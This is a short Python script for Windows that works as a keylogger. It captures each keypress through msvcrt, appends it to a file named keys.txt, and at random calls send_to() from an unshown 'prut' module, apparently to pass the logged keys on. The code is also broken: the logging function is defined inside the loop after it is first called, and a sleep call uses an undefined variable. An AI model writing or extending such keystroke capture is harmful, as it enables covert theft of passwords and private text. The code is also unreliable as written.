import msvcrt
import random 
import string 
import prut
from prut import *

listnum = 1,2,4,8,10,20,40,80,100,16,24,32,46,76,92

while True:
    if msvcrt.kbhit():
        is_pressed = msvcrt.getch()
        print(is_pressed)
        write_in_file(is_pressed)

    def write_in_file(text):
        files = open("keys.txt", "a", encoding='utf-8')
        files.write(str(text))
        files.close()
        m = random.randint(1,100)
        if m in listnum:
            prut.send_to()
        else:
            print("Skipping")
        
    def catapult():
        prut.sleep(t)